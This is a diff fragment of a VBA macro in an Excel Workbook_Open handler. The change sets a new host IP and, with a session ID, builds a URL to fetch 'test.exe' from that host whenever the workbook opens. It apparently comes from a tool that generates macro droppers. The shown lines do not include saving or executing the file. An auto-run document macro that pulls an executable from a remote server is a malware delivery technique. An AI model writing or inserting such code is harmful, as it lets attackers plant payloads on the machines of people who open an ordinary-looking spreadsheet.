@@ -9,7 +9,7 @@ Private Sub Workbook_Open()
          Dim TextFile As Object
 
 
-         ip = "192.168.100.156:5000"
+         ip = "192.168.18.7:5000"
          session = "61ea569c5e74d49a0c177282"
          FileUrl = "http://" & ip & "/download/exe/" & session & "/test.exe"
 
